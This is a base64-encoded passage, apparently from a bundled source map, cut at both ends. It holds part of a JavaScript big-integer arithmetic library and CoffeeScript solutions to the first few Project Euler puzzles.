0gLTE7XHJcbiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IHJlc3VsdFN1bS5sZW5ndGg7IGkrKykge1xyXG4gICAgICAgICAgICAgICAgICAgIHZhciBsZW4gPSByZXN1bHRTdW1baV0ubGVuZ3RoO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChsZW4gPiBtYXgpIG1heCA9IGxlbjtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHZhciByZXN1bHQgPSBbXSwgY2FycnkgPSAwO1xyXG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBtYXggfHwgY2FycnkgPiAwOyBpKyspIHtcclxuICAgICAgICAgICAgICAgICAgICB2YXIgc3VtID0gY2Fycnk7XHJcbiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDA7IGogPCByZXN1bHRTdW0ubGVuZ3RoOyBqKyspIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3VtICs9IHJlc3VsdFN1bVtqXVtpXSB8fCAwO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICBjYXJyeSA9IHN1bSA+IGJhc2UgPyBNYXRoLmZsb29yKHN1bSAvIGJhc2UpIDogMDtcclxuICAgICAgICAgICAgICAgICAgICBzdW0gLT0gY2FycnkgKiBiYXNlO1xyXG4gICAgICAgICAgICAgICAgICAgIHJlc3VsdC5wdXNoKHN1bSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gYmlnSW50KHJlc3VsdCwgcyk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIHRpbWVzOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8ubXVsdGlwbHkobiwgbSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIGRpdm1vZDogZnVuY3Rpb24gKG4sIG0pIHtcclxuICAgICAgICAgICAgICAgIHZhciBzLCBmaXJzdCA9IHNlbGYsIHNlY29uZDtcclxuICAgICAgICAgICAgICAgIGlmIChtKSAoZmlyc3QgPSBwYXJzZShuKSkgJiYgKHNlY29uZCA9IHBhcnNlKG0pKTtcclxuICAgICAgICAgICAgICAgIGVsc2Ugc2Vjb25kID0gcGFyc2UobiwgZmlyc3QpO1xyXG4gICAgICAgICAgICAgICAgcyA9IGZpcnN0LnNpZ24gIT09IHNlY29uZC5zaWduO1xyXG4gICAgICAgICAgICAgICAgaWYgKGJpZ0ludChmaXJzdC52YWx1ZSwgZmlyc3Quc2lnbikuZXF1YWxzKDApKSByZXR1cm4ge1xyXG4gICAgICAgICAgICAgICAgICAgIHF1b3RpZW50OiBiaWdJbnQoWzBdLCBzaWduLnBvc2l0aXZlKSxcclxuICAgICAgICAgICAgICAgICAgICByZW1haW5kZXI6IGJpZ0ludChbMF0sIHNpZ24ucG9zaXRpdmUpXHJcbiAgICAgICAgICAgICAgICB9O1xyXG4gICAgICAgICAgICAgICAgaWYgKHNlY29uZC5lcXVhbHMoMCkpIHRocm93IG5ldyBFcnJvcihcIkNhbm5vdCBkaXZpZGUgYnkgemVyb1wiKTtcclxuICAgICAgICAgICAgICAgIHZhciBhID0gZmlyc3QudmFsdWUsIGIgPSBzZWNvbmQudmFsdWU7XHJcbiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gW10sIHJlbWFpbmRlciA9IFtdO1xyXG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IGEubGVuZ3RoIC0gMTsgaSA+PSAwOyBpLS0pIHtcclxuICAgICAgICAgICAgICAgICAgICB2YXIgbiA9IFthW2ldXS5jb25jYXQocmVtYWluZGVyKTtcclxuICAgICAgICAgICAgICAgICAgICB2YXIgcXVvdGllbnQgPSBnb2VzSW50byhiLCBuKTtcclxuICAgICAgICAgICAgICAgICAgICByZXN1bHQucHVzaChxdW90aWVudC5yZXN1bHQpO1xyXG4gICAgICAgICAgICAgICAgICAgIHJlbWFpbmRlciA9IHF1b3RpZW50LnJlbWFpbmRlcjtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHJlc3VsdC5yZXZlcnNlKCk7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4ge1xyXG4gICAgICAgICAgICAgICAgICAgIHF1b3RpZW50OiBiaWdJbnQocmVzdWx0LCBzKSxcclxuICAgICAgICAgICAgICAgICAgICByZW1haW5kZXI6IGJpZ0ludChyZW1haW5kZXIsIGZpcnN0LnNpZ24pXHJcbiAgICAgICAgICAgICAgICB9O1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBkaXZpZGU6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gby5kaXZtb2QobiwgbSkucXVvdGllbnQ7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIG92ZXI6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gby5kaXZpZGUobiwgbSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIG1vZDogZnVuY3Rpb24gKG4sIG0pIHtcclxuICAgICAgICAgICAgICAgIHJldHVybiBvLmRpdm1vZChuLCBtKS5yZW1haW5kZXI7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIHJlbWFpbmRlcjogZnVuY3Rpb24obiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8ubW9kKG4sIG0pO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBwb3c6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICB2YXIgZmlyc3QgPSBzZWxmLCBzZWNvbmQ7XHJcbiAgICAgICAgICAgICAgICBpZiAobSkgKGZpcnN0ID0gcGFyc2UobikpICYmIChzZWNvbmQgPSBwYXJzZShtKSk7XHJcbiAgICAgICAgICAgICAgICBlbHNlIHNlY29uZCA9IHBhcnNlKG4sIGZpcnN0KTtcclxuICAgICAgICAgICAgICAgIHZhciBhID0gZmlyc3QsIGIgPSBzZWNvbmQ7XHJcbiAgICAgICAgICAgICAgICBpZiAoYmlnSW50KGEudmFsdWUsIGEuc2lnbikuZXF1YWxzKDApKSByZXR1cm4gWkVSTztcclxuICAgICAgICAgICAgICAgIGlmIChiLmxlc3NlcigwKSkgcmV0dXJuIFpFUk87XHJcbiAgICAgICAgICAgICAgICBpZiAoYi5lcXVhbHMoMCkpIHJldHVybiBPTkU7XHJcbiAgICAgICAgICAgICAgICB2YXIgcmVzdWx0ID0gYmlnSW50KGEudmFsdWUsIGEuc2lnbik7XHJcblxyXG4gICAgICAgICAgICAgICAgaWYgKGIubW9kKDIpLmVxdWFscygwKSkge1xyXG4gICAgICAgICAgICAgICAgICAgIHZhciBjID0gcmVzdWx0LnBvdyhiLm92ZXIoMikpO1xyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBjLnRpbWVzKGMpO1xyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0LnRpbWVzKHJlc3VsdC5wb3coYi5taW51cygxKSkpO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBuZXh0OiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gbSB8fCBzZWxmO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uYWRkKGZpcnN0LCAxKTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgcHJldjogZnVuY3Rpb24gKG0pIHtcclxuICAgICAgICAgICAgICAgIHZhciBmaXJzdCA9IG0gfHwgc2VsZjtcclxuICAgICAgICAgICAgICAgIHJldHVybiBvLnN1YnRyYWN0KGZpcnN0LCAxKTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgY29tcGFyZTogZnVuY3Rpb24gKG4sIG0pIHtcclxuICAgICAgICAgICAgICAgIHZhciBmaXJzdCA9IHNlbGYsIHNlY29uZDtcclxuICAgICAgICAgICAgICAgIGlmIChtKSAoZmlyc3QgPSBwYXJzZShuKSkgJiYgKHNlY29uZCA9IHBhcnNlKG0sIGZpcnN0KSk7XHJcbiAgICAgICAgICAgICAgICBlbHNlIHNlY29uZCA9IHBhcnNlKG4sIGZpcnN0KTtcclxuICAgICAgICAgICAgICAgIG5vcm1hbGl6ZShmaXJzdCwgc2Vjb25kKTtcclxuICAgICAgICAgICAgICAgIGlmIChmaXJzdC52YWx1ZS5sZW5ndGggPT09IDEgJiYgc2Vjb25kLnZhbHVlLmxlbmd0aCA9PT0gMSAmJiBmaXJzdC52YWx1ZVswXSA9PT0gMCAmJiBzZWNvbmQudmFsdWVbMF0gPT09IDApIHJldHVybiAwO1xyXG4gICAgICAgICAgICAgICAgaWYgKHNlY29uZC5zaWduICE9PSBmaXJzdC5zaWduKSByZXR1cm4gZmlyc3Quc2lnbiA9PT0gc2lnbi5wb3NpdGl2ZSA/IDEgOiAtMTtcclxuICAgICAgICAgICAgICAgIHZhciBtdWx0aXBsaWVyID0gZmlyc3Quc2lnbiA9PT0gc2lnbi5wb3NpdGl2ZSA/IDEgOiAtMTtcclxuICAgICAgICAgICAgICAgIHZhciBhID0gZmlyc3QudmFsdWUsIGIgPSBzZWNvbmQudmFsdWU7XHJcbiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gYS5sZW5ndGggLSAxOyBpID49IDA7IGktLSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChhW2ldID4gYltpXSkgcmV0dXJuIDEgKiBtdWx0aXBsaWVyO1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChiW2ldID4gYVtpXSkgcmV0dXJuIC0xICogbXVsdGlwbGllcjtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIHJldHVybiAwO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBjb21wYXJlVG86IGZ1bmN0aW9uKG4sIG0pIHtcclxuICAgICAgICAgICAgICAgIHJldHVybiBvLmNvbXBhcmUobiwgbSk7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIGNvbXBhcmVBYnM6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICB2YXIgZmlyc3QgPSBzZWxmLCBzZWNvbmQ7XHJcbiAgICAgICAgICAgICAgICBpZiAobSkgKGZpcnN0ID0gcGFyc2UobikpICYmIChzZWNvbmQgPSBwYXJzZShtLCBmaXJzdCkpO1xyXG4gICAgICAgICAgICAgICAgZWxzZSBzZWNvbmQgPSBwYXJzZShuLCBmaXJzdCk7XHJcbiAgICAgICAgICAgICAgICBmaXJzdC5zaWduID0gc2Vjb25kLnNpZ24gPSBzaWduLnBvc2l0aXZlO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uY29tcGFyZShmaXJzdCwgc2Vjb25kKTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgZXF1YWxzOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uY29tcGFyZShuLCBtKSA9PT0gMDtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgbm90RXF1YWxzOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuICFvLmVxdWFscyhuLCBtKTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgbGVzc2VyOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uY29tcGFyZShuLCBtKSA8IDA7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIGdyZWF0ZXI6IGZ1bmN0aW9uIChuLCBtKSB7XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gby5jb21wYXJlKG4sIG0pID4gMDtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgZ3JlYXRlck9yRXF1YWxzOiBmdW5jdGlvbiAobiwgbSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8uY29tcGFyZShuLCBtKSA+PSAwO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBsZXNzZXJPckVxdWFsczogZnVuY3Rpb24gKG4sIG0pIHtcclxuICAgICAgICAgICAgICAgIHJldHVybiBvLmNvbXBhcmUobiwgbSkgPD0gMDtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgaXNQb3NpdGl2ZTogZnVuY3Rpb24gKG0pIHtcclxuICAgICAgICAgICAgICAgIHZhciBmaXJzdCA9IG0gfHwgc2VsZjtcclxuICAgICAgICAgICAgICAgIHJldHVybiBmaXJzdC5zaWduID09PSBzaWduLnBvc2l0aXZlO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBpc05lZ2F0aXZlOiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gbSB8fCBzZWxmO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZpcnN0LnNpZ24gPT09IHNpZ24ubmVnYXRpdmU7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIGlzRXZlbjogZnVuY3Rpb24gKG0pIHtcclxuICAgICAgICAgICAgICAgIHZhciBmaXJzdCA9IG0gfHwgc2VsZjtcclxuICAgICAgICAgICAgICAgIHJldHVybiBmaXJzdC52YWx1ZVswXSAlIDIgPT09IDA7XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIGlzT2RkOiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgdmFyIGZpcnN0ID0gbSB8fCBzZWxmO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGZpcnN0LnZhbHVlWzBdICUgMiA9PT0gMTtcclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgdG9TdHJpbmc6IGZ1bmN0aW9uIChtKSB7XHJcbiAgICAgICAgICAgICAgICB2YXIgZmlyc3QgPSBtIHx8IHNlbGY7XHJcbiAgICAgICAgICAgICAgICB2YXIgc3RyID0gXCJcIiwgbGVuID0gZmlyc3QudmFsdWUubGVuZ3RoO1xyXG4gICAgICAgICAgICAgICAgd2hpbGUgKGxlbi0tKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGZpcnN0LnZhbHVlW2xlbl0udG9TdHJpbmcoKS5sZW5ndGggPT09IDgpIHN0ciArPSBmaXJzdC52YWx1ZVtsZW5dO1xyXG4gICAgICAgICAgICAgICAgICAgIGVsc2Ugc3RyICs9IChiYXNlLnRvU3RyaW5nKCkgKyBmaXJzdC52YWx1ZVtsZW5dKS5zbGljZSgtbG9nQmFzZSk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB3aGlsZSAoc3RyWzBdID09PSBcIjBcIikge1xyXG4gICAgICAgICAgICAgICAgICAgIHN0ciA9IHN0ci5zbGljZSgxKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGlmICghc3RyLmxlbmd0aCkgc3RyID0gXCIwXCI7XHJcbiAgICAgICAgICAgICAgICBpZiAoc3RyID09PSBcIjBcIikgcmV0dXJuIHN0cjtcclxuICAgICAgICAgICAgICAgIHZhciBzID0gZmlyc3Quc2lnbiA9PT0gc2lnbi5wb3NpdGl2ZSA/IFwiXCIgOiBcIi1cIjtcclxuICAgICAgICAgICAgICAgIHJldHVybiBzICsgc3RyO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICB0b0pTTnVtYmVyOiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuICtvLnRvU3RyaW5nKG0pO1xyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICB2YWx1ZU9mOiBmdW5jdGlvbiAobSkge1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuIG8udG9KU051bWJlcihtKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH07XHJcbiAgICAgICAgcmV0dXJuIG87XHJcbiAgICB9O1xyXG5cclxuICAgIHZhciBaRVJPID0gYmlnSW50KFswXSwgc2lnbi5wb3NpdGl2ZSk7XHJcbiAgICB2YXIgT05FID0gYmlnSW50KFsxXSwgc2lnbi5wb3NpdGl2ZSk7XHJcbiAgICB2YXIgTUlOVVNfT05FID0gYmlnSW50KFsxXSwgc2lnbi5uZWdhdGl2ZSk7XHJcblxyXG4gICAgdmFyIHBhcnNlQmFzZSA9IGZ1bmN0aW9uICh0ZXh0LCBiYXNlKSB7XHJcbiAgICAgICAgYmFzZSA9IHBhcnNlKGJhc2UpO1xyXG4gICAgICAgIHZhciB2YWwgPSBaRVJPO1xyXG4gICAgICAgIHZhciBkaWdpdHMgPSBbXTtcclxuICAgICAgICB2YXIgaTtcclxuICAgICAgICB2YXIgaXNOZWdhdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIGZ1bmN0aW9uIHBhcnNlVG9rZW4odGV4dCkge1xyXG4gICAgICAgICAgICB2YXIgYyA9IHRleHRbaV0udG9Mb3dlckNhc2UoKTtcclxuICAgICAgICAgICAgaWYgKGkgPT09IDAgJiYgdGV4dFtpXSA9PT0gXCItXCIpIHtcclxuICAgICAgICAgICAgICAgIGlzTmVnYXRpdmUgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgcmV0dXJuO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGlmICgvWzAtOV0vLnRlc3QoYykpIGRpZ2l0cy5wdXNoKHBhcnNlKGMpKTtcclxuICAgICAgICAgICAgZWxzZSBpZiAoL1thLXpdLy50ZXN0KGMpKSBkaWdpdHMucHVzaChwYXJzZShjLmNoYXJDb2RlQXQoMCkgLSA4NykpO1xyXG4gICAgICAgICAgICBlbHNlIGlmIChjID09PSBcIjxcIikge1xyXG4gICAgICAgICAgICAgICAgdmFyIHN0YXJ0ID0gaTtcclxuICAgICAgICAgICAgICAgIGRvIGkrKzsgd2hpbGUgKHRleHRbaV0gIT09IFwiPlwiKTtcclxuICAgICAgICAgICAgICAgIGRpZ2l0cy5wdXNoKHBhcnNlKHRleHQuc2xpY2Uoc3RhcnQgKyAxLCBpKSkpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGVsc2UgdGhyb3cgbmV3IEVycm9yKGMgKyBcIiBpcyBub3QgYSB2YWxpZCBjaGFyYWN0ZXJcIik7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCB0ZXh0Lmxlbmd0aDsgaSsrKSB7XHJcbiAgICAgICAgICAgIHBhcnNlVG9rZW4odGV4dCk7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIGRpZ2l0cy5yZXZlcnNlKCk7XHJcbiAgICAgICAgZm9yIChpID0gMDsgaSA8IGRpZ2l0cy5sZW5ndGg7IGkrKykge1xyXG4gICAgICAgICAgICB2YWwgPSB2YWwuYWRkKGRpZ2l0c1tpXS50aW1lcyhiYXNlLnBvdyhpKSkpO1xyXG4gICAgICAgIH1cclxuICAgICAgICByZXR1cm4gaXNOZWdhdGl2ZSA/IC12YWwgOiB2YWw7XHJcbiAgICB9XHJcblxyXG4gICAgdmFyIGZuUmV0dXJuID0gZnVuY3Rpb24gKGEsIGIpIHtcclxuICAgICAgICBpZiAodHlwZW9mIGEgPT09IFwidW5kZWZpbmVkXCIpIHJldHVybiBaRVJPO1xyXG4gICAgICAgIGlmICh0eXBlb2YgYiAhPT0gXCJ1bmRlZmluZWRcIikgcmV0dXJuIHBhcnNlQmFzZShhLCBiKTtcclxuICAgICAgICByZXR1cm4gcGFyc2UoYSk7XHJcbiAgICB9O1xyXG4gICAgZm5SZXR1cm4uemVybyA9IFpFUk87XHJcbiAgICBmblJldHVybi5vbmUgPSBPTkU7XHJcbiAgICBmblJldHVybi5taW51c09uZSA9IE1JTlVTX09ORTtcclxuICAgIHJldHVybiBmblJldHVybjtcclxufSkoKTtcclxuXHJcbmlmICh0eXBlb2YgbW9kdWxlICE9PSBcInVuZGVmaW5lZFwiKSB7XHJcbiAgICBtb2R1bGUuZXhwb3J0cyA9IGJpZ0ludDtcclxufSIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDE6IE11bHRpcGxlcyBvZiAzIGFuZCA1XG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbklmIHdlIGxpc3QgYWxsIHRoZSBuYXR1cmFsIG51bWJlcnMgYmVsb3cgMTAgdGhhdCBhcmUgbXVsdGlwbGVzIG9mIDMgb3IgNSwgd2UgZ2V0IDMsIDUsIDYgYW5kIDkuXG5UaGUgc3VtIG9mIHRoZXNlIG11bHRpcGxlcyBpcyAyMy5cblxuRmluZCB0aGUgc3VtIG9mIGFsbCB0aGUgbXVsdGlwbGVzIG9mIDMgb3IgNSBiZWxvdyAxMDAwLlxuXG5cIlwiXCJcblxucHJvYmxlbS50ZXN0ID0gLT5cbiAgc3VtID0gMFxuICBmb3IgaSBpbiBbMS4uLjEwXVxuICAgIGlmIChpICUgMyA9PSAwKSBvciAoaSAlIDUgPT0gMClcbiAgICAgIHN1bSArPSBpXG4gIGVxdWFsKHN1bSwgMjMsIFwiU3VtIG9mIG5hdHVyYWwgbnVtYmVycyA8IDEwOiAje3N1bX1cIilcblxucHJvYmxlbS5hbnN3ZXIgPSAtPlxuICBzdW0gPSAwXG4gIGZvciBpIGluIFsxLi4uMTAwMF1cbiAgICBpZiAoaSAlIDMgPT0gMCkgb3IgKGkgJSA1ID09IDApXG4gICAgICBzdW0gKz0gaVxuXG4gIHJldHVybiBzdW1cbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDI6IEV2ZW4gRmlib25hY2NpIG51bWJlcnNcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG5FYWNoIG5ldyB0ZXJtIGluIHRoZSBGaWJvbmFjY2kgc2VxdWVuY2UgaXMgZ2VuZXJhdGVkIGJ5IGFkZGluZyB0aGUgcHJldmlvdXMgdHdvIHRlcm1zLlxuQnkgc3RhcnRpbmcgd2l0aCAxIGFuZCAyLCB0aGUgZmlyc3QgMTAgdGVybXMgd2lsbCBiZTpcblxuMSwgMiwgMywgNSwgOCwgMTMsIDIxLCAzNCwgNTUsIDg5LCAuLi5cblxuQnkgY29uc2lkZXJpbmcgdGhlIHRlcm1zIGluIHRoZSBGaWJvbmFjY2kgc2VxdWVuY2Ugd2hvc2UgdmFsdWVzIGRvIG5vdCBleGNlZWQgZm91ciBtaWxsaW9uLFxuZmluZCB0aGUgc3VtIG9mIHRoZSBldmVuLXZhbHVlZCB0ZXJtcy5cblxuXCJcIlwiXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgcHJldiA9IDFcbiAgY3VyciA9IDFcbiAgc3VtID0gMFxuXG4gIHdoaWxlIGN1cnIgPCA0MDAwMDAwXG4gICAgaWYgKGN1cnIgJSAyKSA9PSAwXG4gICAgICBzdW0gKz0gY3VyclxuXG4gICAgbmV4dCA9IGN1cnIgKyBwcmV2XG4gICAgcHJldiA9IGN1cnJcbiAgICBjdXJyID0gbmV4dFxuXG4gIHJldHVybiBzdW1cbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDM6IExhcmdlc3QgcHJpbWUgZmFjdG9yXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cblRoZSBwcmltZSBmYWN0b3JzIG9mIDEzMTk1IGFyZSA1LCA3LCAxMyBhbmQgMjkuXG5cbldoYXQgaXMgdGhlIGxhcmdlc3QgcHJpbWUgZmFjdG9yIG9mIHRoZSBudW1iZXIgNjAwODUxNDc1MTQzID9cblxuXCJcIlwiXG5cbiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cbiMgU2hhbWVsZXNzbHkgcGlsZmVyZWQvYWRvcHRlZCBmcm9tIGh0dHA6Ly93d3cuamF2YXNjcmlwdGVyLm5ldC9mYXEvbnVtYmVyaXNwcmltZS5odG1cblxubGVhc3RGYWN0b3IgPSAobikgLT5cbiAgcmV0dXJuIE5hTiBpZiBpc05hTihuKSBvciBub3QgaXNGaW5pdGUobilcbiAgcmV0dXJuIDAgaWYgbiA9PSAwXG4gIHJldHVybiAxIGlmIChuICUgMSkgIT0gMCBvciAobiAqIG4pIDwgMlxuICByZXR1cm4gMiBpZiAobiAlIDIpID09IDBcbiAgcmV0dXJuIDMgaWYgKG4gJSAzKSA9PSAwXG4gIHJldHVybiA1IGlmIChuICUgNSkgPT0gMFxuXG4gIG0gPSBNYXRoLnNxcnQgblxuICBmb3IgaSBpbiBbNy4ubV0gYnkgMzBcbiAgICByZXR1cm4gaSAgICBpZiAobiAlIGkpICAgICAgPT0gMFxuICAgIHJldHVybiBpKzQgIGlmIChuICUgKGkrNCkpICA9PSAwXG4gICAgcmV0dXJuIGkrNiAgaWYgKG4gJSAoaSs2KSkgID09IDBcbiAgICByZXR1cm4gaSsxMCBpZiAobiAlIChpKzEwKSkgPT0gMFxuICAgIHJldHVybiBpKzEyIGlmIChuICUgKGkrMTIpKSA9PSAwXG4gICAgcmV0dXJuIGkrMTYgaWYgKG4gJSAoaSsxNikpID09IDBcbiAgICByZXR1cm4gaSsyMiBpZiAobiAlIChpKzIyKSkgPT0gMFxuICAgIHJldHVybiBpKzI0IGlmIChuICUgKGkrMjQpKSA9PSAwXG5cbiAgcmV0dXJuIG5cblxuaXNQcmltZSA9IChuKSAtPlxuICBpZiBpc05hTihuKSBvciBub3QgaXNGaW5pdGUobikgb3IgKG4gJSAxKSAhPSAwIG9yIChuIDwgMilcbiAgICByZXR1cm4gZmFsc2VcbiAgaWYgbiA9PSBsZWFzdEZhY3RvcihuKVxuICAgIHJldHVybiB0cnVlXG5cbiAgcmV0dXJuIGZhbHNlXG5cbiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxucHJpbWVGYWN0b3JzID0gKG4pIC0+XG4gIHJldHVybiBbMV0gaWYgbiA9PSAxXG5cbiAgZmFjdG9ycyA9IFtdXG4gIHdoaWxlIG5vdCBpc1ByaW1lKG4pXG4gICAgZmFjdG9yID0gbGVhc3RGYWN0b3IobilcbiAgICBmYWN0b3JzLnB1c2ggZmFjdG9yXG4gICAgbiAvPSBmYWN0b3JcbiAgZmFjdG9ycy5wdXNoIG5cbiAgcmV0dXJuIGZhY3RvcnNcblxubGFyZ2VzdFByaW1lRmFjdG9yID0gKG4pIC0+XG4gIHJldHVybiAxIGlmIG4gPT0gMVxuXG4gIHdoaWxlIG5vdCBpc1ByaW1lKG4pXG4gICAgZmFjdG9yID0gbGVhc3RGYWN0b3IobilcbiAgICBuIC89IGZhY3RvclxuICByZXR1cm4gblxuXG5wcm9ibGVtLmFuc3dlciA9IC0+XG4gIHJldHVybiBsYXJnZXN0UHJpbWVGYWN0b3IoNjAwODUxNDc1MTQzKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gNDogTGFyZ2VzdCBwYWxpbmRyb21lIHByb2R1Y3Rcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuQSBwYWxpbmRyb21pYyBudW1iZXIgcmVhZHMgdGhlIHNhbWUgYm90aCB3YXlzLlxuXG5GaW5kIHRoZSBsYXJnZXN0IHBhbGluZHJvbWUgbWFkZSBmcm9tIHRoZSBwcm9kdWN0IG9mIHR3byAzLWRpZ2l0IG51bWJlcnMuXG5cblwiXCJcIlxuXG5pc1BhbGluZHJvbWUgPSAobikgLT5cbiAgc3RyID0gbi50b1N0cmluZygpXG4gIGZvciBpIGluIFswLi4uKHN0ci5sZW5ndGggLyAyKV1cbiAgICBpZiBzdHJbaV0gIT0gc3RyW3N0ci5sZW5ndGggLSAxIC0gaV1cbiAgICAgIHJldHVybiBmYWxzZVxuICByZXR1cm4gdHJ1ZVxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICAjIE1ha2Ugc3VyZSBpc1BhbGluZHJvbWUgd29ya3MgcHJvcGVybHkgZmlyc3RcbiAgZm9yIHYgaW4gWzEsIDExLCAxMjEsIDEyMjEsIDEyMzIxLCAxMjM0MzIxXVxuICAgIGVxdWFsKGlzUGFsaW5kcm9tZSh2KSwgdHJ1ZSwgXCJpc1BhbGluZHJvbWUoI3t2fSkgcmV0dXJucyB0cnVlXCIpXG4gIGZvciB2IGluIFsxMiwgMTIzLCAxMjM0LCAxMjM0NSwgMTIzNDU2LCAxMjMyNF1cbiAgICBlcXVhbChpc1BhbGluZHJvbWUodiksIGZhbHNlLCBcImlzUGFsaW5kcm9tZSg